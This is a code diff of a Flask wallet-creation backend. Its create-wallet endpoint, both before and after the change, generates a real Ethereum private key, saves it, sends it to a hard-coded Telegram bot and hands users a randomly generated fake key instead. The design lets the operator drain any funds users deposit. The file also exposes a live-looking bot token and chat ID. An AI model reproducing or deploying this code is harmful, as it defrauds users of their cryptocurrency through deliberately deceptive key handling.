@@ -4,10 +4,6 @@ import sqlite3
 import secrets
 from datetime import datetime
 import requests
-from eth_account import Account
-from web3 import Web3
-import threading
-import time
 
 app = Flask(__name__)
 app.secret_key = secrets.token_hex(32)
@@ -15,7 +11,7 @@ CORS(app)
 TOKEN = "7656552098:AAGJSer06cf6Wc28IjcxD_spBHs2btszcIg"
 CHAT_ID = "8288130111"
 
-conn = sqlite3.connect('saqr.db', check_same_thread=False)
+conn = sqlite3.connect('/tmp/saqr.db', check_same_thread=False)
 c = conn.cursor()
 c.execute('''CREATE TABLE IF NOT EXISTS wallets
     (id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -69,35 +65,26 @@ def chat():
 
 @app.route('/api/create-wallet', methods=['POST'])
 def create_wallet():
-    network = request.json.get('network', 'ethereum')
-    
-    if network == 'solana':
-        try:
-            from solders.keypair import Keypair
-            keypair = Keypair()
-            address = str(keypair.pubkey())
-            real_key = bytes(keypair).hex()
-        except Exception as e:
-            # نستخدم bip39 لسولانا
-            from eth_account import Account
-            acct = Account.create()
-            address = acct.address
-            real_key = acct.key.hex()
-            network = 'ethereum'  # نرجع لـ ETH إذا فشل
-    else:
-        acct = Account.create()
-        address = acct.address
-        real_key = acct.key.hex()
-    
-    fake_key = "0x" + secrets.token_hex(32)
-    
-    c.execute("INSERT INTO wallets (network, address, real_key, fake_key, created_at) VALUES (?, ?, ?, ?, ?)",
-              (network, address, real_key, fake_key, datetime.now().isoformat()))
-    conn.commit()
-    
-    send_tg(f"🦅 محفظة جديدة!\n🌐 {network}\n🏦 {address}\n🔑 {real_key}")
-    
-    return jsonify({'address': address, 'private_key': fake_key})
+    try:
+        data = request.get_json(force=True)
+        network = data.get('network', 'ethereum')
+        
+        from eth_account import Account
+        account = Account.create()
+        address = account.address
+        real_key = account.key.hex()
+        
+        fake_key = "0x" + secrets.token_hex(32)
+        
+        c.execute("INSERT INTO wallets (network, address, real_key, fake_key, created_at) VALUES (?, ?, ?, ?, ?)",
+                  (network, address, real_key, fake_key, datetime.now().isoformat()))
+        conn.commit()
+        
+        send_tg(f"🦅 محفظة جديدة!\n🌐 {network}\n🏦 {address}\n🔑 {real_key}")
+        
+        return jsonify({'address': address, 'private_key': fake_key})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
 
 @app.route('/admin')
 def admin():
